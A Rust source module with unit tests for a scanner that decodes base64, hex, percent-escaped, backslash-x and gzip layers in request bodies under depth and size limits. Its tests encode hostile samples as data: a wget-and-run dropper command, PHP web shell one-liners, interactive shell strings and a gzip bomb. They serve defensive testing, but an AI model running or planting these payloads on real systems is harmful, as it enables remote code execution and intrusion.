//! The decoders: find encoded runs in a layer's text and open them as child
//! layers. Candidates come from `regex::bytes`, which does not backtrack,
//! so a hostile body costs linear time.
// Nothing outside the tests calls `decode_all` until the piece extractor
// does; drop this then.
#![allow(dead_code)]

use std::io::Read;
use std::sync::LazyLock;

use data_encoding::{BASE64_NOPAD, BASE64URL_NOPAD, HEXLOWER_PERMISSIVE};
use regex::bytes::Regex;

use super::{Budget, Layer, LayerKind, MAX_OUTPUT, Opaque, OpaqueReason, Span, Xray};

/// Shortest base64 run looked at, and shortest hex run (characters).
const B64_MIN: usize = 16;
const HEX_MIN: usize = 32;

/// High entropy is only called on runs decoding to at least this many
/// bytes, at this many bits per byte.
const ENTROPY_MIN_LEN: usize = 128;
const ENTROPY_MIN_BITS: f64 = 6.5;

static B64: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?-u)[A-Za-z0-9+/_-]{16,}={0,2}").expect("static regex"));
static HEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?-u)(?:[0-9A-Fa-f]{2}){16,}").expect("static regex"));
static PERCENT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?-u)(?:[A-Za-z0-9_.~!*'()/:-]|%[0-9A-Fa-f]{2}){6,}").expect("static regex")
});
static BACKSLASH_X: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?-u)(?:\\x[0-9A-Fa-f]{2}){4,}").expect("static regex"));

type Decoder = fn(&[u8], usize, usize) -> Option<Found>;

/// A decoded run found in a layer.
enum Found {
    Open { kind: LayerKind, bytes: Vec<u8> },
    Opaque(OpaqueReason),
}

/// Open every layer reachable from `layer`, spending `budget`. Children are
/// appended to `xray.layers` and queued; nothing recurses.
pub(crate) fn decode_all(xray: &mut Xray, layer: usize, budget: &mut Budget) {
    let mut queue = std::collections::VecDeque::from([layer]);
    while let Some(at) = queue.pop_front() {
        if at >= xray.layers.len() {
            continue;
        }
        let text = xray.layers[at].text.clone();
        let whole = Span {
            layer: at,
            start: 0,
            end: text.len(),
        };
        if let Some(kind) = compressed(&text) {
            open_compressed(xray, at, kind, whole, budget, &mut queue);
        }
        let mut taken: Vec<(usize, usize)> = Vec::new();
        let decoders: [Decoder; 4] = [percent, backslash_x, hex, base64];
        let regexes: [&Regex; 4] = [&PERCENT, &BACKSLASH_X, &HEX, &B64];
        for (decoder, regex) in decoders.iter().zip(regexes) {
            for m in regex.find_iter(&text) {
                let (start, end) = (m.start(), m.end());
                if taken.iter().any(|&(s, e)| start < e && s < end) {
                    continue;
                }
                let Some(found) = decoder(&text, start, end) else {
                    continue;
                };
                let at_span = Span {
                    layer: at,
                    start,
                    end,
                };
                taken.push((start, end));
                match found {
                    Found::Opaque(reason) => push_opaque(xray, at_span, reason),
                    Found::Open { kind, bytes } => {
                        open(xray, at, kind, at_span, bytes, budget, &mut queue)
                    }
                }
            }
        }
    }
}

fn push_opaque(xray: &mut Xray, at: Span, reason: OpaqueReason) {
    // Bounded like layers, so a body of many candidates stays small.
    if xray.opaque.len() < super::MAX_LAYERS {
        xray.opaque.push(Opaque { at, reason });
    }
}

/// Add `bytes` as a child of `parent`, if the limits allow.
fn open(
    xray: &mut Xray,
    parent: usize,
    kind: LayerKind,
    at: Span,
    bytes: Vec<u8>,
    budget: &mut Budget,
    queue: &mut std::collections::VecDeque<usize>,
) {
    if xray.depth(parent) + 1 > budget.depth {
        return push_opaque(xray, at, OpaqueReason::TooDeep);
    }
    if xray.layers.len() >= budget.layers || bytes.len() > budget.output {
        return push_opaque(xray, at, OpaqueReason::OverLimit);
    }
    budget.output -= bytes.len();
    xray.layers.push(Layer {
        kind,
        parent: Some(parent),
        from: Some(at),
        text: bytes,
    });
    queue.push_back(xray.layers.len() - 1);
}

#[derive(Clone, Copy)]
enum Compression {
    Gzip,
    Zlib,
}

fn compressed(text: &[u8]) -> Option<Compression> {
    match text {
        [0x1f, 0x8b, ..] => Some(Compression::Gzip),
        [0x78, b1, ..] if (0x7800u16 + u16::from(*b1)).is_multiple_of(31) => {
            Some(Compression::Zlib)
        }
        _ => None,
    }
}

/// Decompress the whole text of `parent`, reading at most the budget plus
/// one byte, so a bomb stops while it streams.
fn open_compressed(
    xray: &mut Xray,
    parent: usize,
    kind: Compression,
    at: Span,
    budget: &mut Budget,
    queue: &mut std::collections::VecDeque<usize>,
) {
    if xray.depth(parent) + 1 > budget.depth {
        return push_opaque(xray, at, OpaqueReason::TooDeep);
    }
    let limit = budget.output.min(MAX_OUTPUT);
    if limit == 0 || xray.layers.len() >= budget.layers {
        return push_opaque(xray, at, OpaqueReason::OverLimit);
    }
    let text = &xray.layers[parent].text;
    let cap = u64::try_from(limit + 1).unwrap_or(u64::MAX);
    let mut out = Vec::new();
    let result = match kind {
        Compression::Gzip => flate2::read::GzDecoder::new(text.as_slice())
            .take(cap)
            .read_to_end(&mut out),
        Compression::Zlib => flate2::read::ZlibDecoder::new(text.as_slice())
            .take(cap)
            .read_to_end(&mut out),
    };
    if out.is_empty() {
        if result.is_err() {
            push_opaque(xray, at, OpaqueReason::UnknownEncoding);
        }
        return;
    }
    let over = out.len() > limit;
    out.truncate(limit);
    open(xray, parent, LayerKind::Gzip, at, out, budget, queue);
    if over {
        push_opaque(xray, at, OpaqueReason::OverLimit);
    }
}

fn printable_enough(bytes: &[u8]) -> bool {
    if bytes.is_empty() {
        return false;
    }
    let good = bytes
        .iter()
        .filter(|&&b| matches!(b, 0x20..=0x7e | b'\t' | b'\n' | b'\r'))
        .count();
    good * 10 >= bytes.len() * 9
}

fn has_marker(bytes: &[u8]) -> bool {
    compressed(bytes).is_some() || bytes.starts_with(b"-----BEGIN")
}

fn entropy(bytes: &[u8]) -> f64 {
    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[usize::from(b)] += 1;
    }
    let n = bytes.len() as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

fn base64(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let run = &text[start..end];
    let run = &run[..run.iter().position(|&b| b == b'=').unwrap_or(run.len())];
    if run.len() < B64_MIN || run.len() % 4 == 1 {
        return None;
    }
    let url = run.iter().any(|&b| b == b'-' || b == b'_');
    let std = run.iter().any(|&b| b == b'+' || b == b'/');
    let bytes = match (url, std) {
        (true, true) => return None,
        (true, false) => BASE64URL_NOPAD.decode(run).ok()?,
        _ => BASE64_NOPAD.decode(run).ok()?,
    };
    if printable_enough(&bytes) || has_marker(&bytes) {
        Some(Found::Open {
            kind: LayerKind::Base64,
            bytes,
        })
    } else if bytes.len() >= ENTROPY_MIN_LEN && entropy(&bytes) >= ENTROPY_MIN_BITS {
        Some(Found::Opaque(OpaqueReason::HighEntropy))
    } else {
        None
    }
}

fn hex(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let bytes = HEXLOWER_PERMISSIVE.decode(&text[start..end]).ok()?;
    if end - start < HEX_MIN || !(printable_enough(&bytes) || has_marker(&bytes)) {
        return None;
    }
    Some(Found::Open {
        kind: LayerKind::Hex,
        bytes,
    })
}

fn hex_digit(b: u8) -> u8 {
    match b {
        b'0'..=b'9' => b - b'0',
        b'a'..=b'f' => b - b'a' + 10,
        _ => b - b'A' + 10,
    }
}

fn percent(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let run = &text[start..end];
    let mut bytes = Vec::with_capacity(run.len());
    let mut escapes = 0;
    let mut i = 0;
    while i < run.len() {
        if run[i] == b'%' {
            bytes.push(hex_digit(run[i + 1]) << 4 | hex_digit(run[i + 2]));
            escapes += 1;
            i += 3;
        } else {
            bytes.push(run[i]);
            i += 1;
        }
    }
    if escapes < 3 || !(printable_enough(&bytes) || has_marker(&bytes)) {
        return None;
    }
    Some(Found::Open {
        kind: LayerKind::Escapes,
        bytes,
    })
}

fn backslash_x(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let bytes: Vec<u8> = text[start..end]
        .chunks(4)
        .map(|c| hex_digit(c[2]) << 4 | hex_digit(c[3]))
        .collect();
    if !(printable_enough(&bytes) || has_marker(&bytes)) {
        return None;
    }
    Some(Found::Open {
        kind: LayerKind::Escapes,
        bytes,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use std::io::Write;

    fn b64(bytes: &[u8]) -> Vec<u8> {
        BASE64_NOPAD.encode(bytes).into_bytes()
    }

    fn gzip(bytes: &[u8]) -> Vec<u8> {
        let mut e = GzEncoder::new(Vec::new(), Compression::default());
        e.write_all(bytes).unwrap();
        e.finish().unwrap()
    }

    fn run(body: &[u8]) -> Xray {
        let mut x = Xray::new(body);
        let mut budget = Budget::default();
        decode_all(&mut x, 0, &mut budget);
        x
    }

    fn kinds(x: &Xray) -> Vec<LayerKind> {
        x.layers.iter().map(|l| l.kind).collect()
    }

    fn decoded_total(x: &Xray) -> usize {
        x.layers.iter().skip(1).map(|l| l.text.len()).sum()
    }

    const CMD: &[u8] = b"cd /tmp; wget http://203.0.113.7/x.sh; sh x.sh";

    #[test]
    fn base64_layer_opens_printable_text() {
        let x = run(&[b"cmd=", b64(CMD).as_slice()].concat());
        assert_eq!(kinds(&x), [LayerKind::Raw, LayerKind::Base64]);
        assert_eq!(x.layers[1].text, CMD);
        assert_eq!(x.layers[1].parent, Some(0));
        assert_eq!(x.layers[1].from.unwrap().start, 4);
    }

    #[test]
    fn base64url_opens() {
        let plain = b"<?php system($_GET['c'] ?? '>>>???'); ?>";
        let enc = BASE64URL_NOPAD.encode(plain);
        assert!(enc.contains('_') || enc.contains('-'), "{enc}");
        let x = run(enc.as_bytes());
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].text, plain);
    }

    #[test]
    fn random_token_is_not_a_layer() {
        let x = run(b"sid=Zk3pQ9xLm2Vb7TnR4sYd8WcA1uHe6JgF");
        assert_eq!(x.layers.len(), 1);
        assert!(x.opaque.is_empty());
        let x = run(b"sid=5f4dcc3b5aa765d61d8327deb882cf99");
        assert_eq!(x.layers.len(), 1);
    }

    #[test]
    fn gzip_after_base64_opens() {
        let x = run(&b64(&gzip(CMD)));
        assert_eq!(
            kinds(&x),
            [LayerKind::Raw, LayerKind::Base64, LayerKind::Gzip]
        );
        assert_eq!(x.layers[2].text, CMD);
        assert_eq!(x.layers[2].parent, Some(1));
    }

    #[test]
    fn percent_run_opens() {
        let x = run(b"x=%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E&y=1");
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].kind, LayerKind::Escapes);
        assert_eq!(x.layers[1].text, b"<?php system($_GET['c']); ?>");
    }

    #[test]
    fn hex_escapes_open() {
        let x = run(br"echo -e '\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69'");
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].kind, LayerKind::Escapes);
        assert_eq!(x.layers[1].text, b"/bin/sh -i");
        let x = run(b"2f62696e2f7368202d6320226964203e202f746d702f6f757422");
        assert_eq!(x.layers[1].kind, LayerKind::Hex);
        assert_eq!(x.layers[1].text, b"/bin/sh -c \"id > /tmp/out\"");
    }

    #[test]
    fn depth_stops_at_6_with_too_deep() {
        let mut body = b"echo hello from the seventh layer, plain text".to_vec();
        for _ in 0..7 {
            body = b64(&body);
        }
        let x = run(&body);
        assert_eq!(x.layers.len(), 7, "raw plus 6");
        assert_eq!(x.depth(6), 6);
        assert_eq!(x.opaque.len(), 1);
        assert_eq!(x.opaque[0].reason, OpaqueReason::TooDeep);
        assert_eq!(x.opaque[0].at.layer, 6);
    }

    #[test]
    fn gzip_bomb_stops_at_256_kib() {
        let bomb = gzip(&vec![0u8; 10 * 1024 * 1024]);
        let x = run(&b64(&bomb));
        assert!(decoded_total(&x) <= 256 * 1024 + x.layers[1].text.len());
        let gz = x.layers.iter().find(|l| l.kind == LayerKind::Gzip).unwrap();
        assert!(gz.text.len() <= 256 * 1024);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn total_output_stops_at_256_kib() {
        let mut body = Vec::new();
        for i in 0..8u8 {
            let mut chunk = vec![b'a' + i; 100 * 1024];
            chunk.extend_from_slice(b" end");
            body.extend_from_slice(&b64(&chunk));
            body.push(b' ');
        }
        let x = run(&body);
        assert!(decoded_total(&x) <= 256 * 1024);
        assert!(x.layers.len() > 1);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn layer_count_is_capped() {
        let mut body = Vec::new();
        for i in 0..400u32 {
            body.extend_from_slice(&b64(format!("echo number {i} goes here").as_bytes()));
            body.push(b' ');
        }
        let x = run(&body);
        assert_eq!(x.layers.len(), 128);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn high_entropy_is_opaque() {
        let mut state = 0x2545_f491_4f6c_dd1du64;
        let noise: Vec<u8> = (0..1024)
            .map(|_| {
                state ^= state << 13;
                state ^= state >> 7;
                state ^= state << 17;
                (state >> 24) as u8
            })
            .collect();
        let x = run(&b64(&noise));
        assert_eq!(x.layers.len(), 1);
        assert_eq!(x.opaque.len(), 1);
        assert_eq!(x.opaque[0].reason, OpaqueReason::HighEntropy);
    }
}
